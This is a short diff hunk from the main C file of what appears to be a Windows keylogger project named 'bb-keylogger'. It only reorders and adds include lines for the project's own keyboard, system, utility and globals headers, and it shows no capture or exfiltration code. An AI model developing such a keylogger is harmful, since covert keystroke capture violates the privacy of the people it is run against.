@@ -38,8 +38,10 @@
 #include <winuser.h>
 
 //---------------------------------------------------------- PERSONNAL INCLUDES
-#include "includes/bb-keylogger-utils.h"
 #include "includes/bb-keylogger-globals.h"
+#include "includes/bb-keylogger-keyboard.h"
+#include "includes/bb-keylogger-system.h"
+#include "includes/bb-keylogger-utils.h"
 
 //------------------------------------------------------------------------ MAIN
 
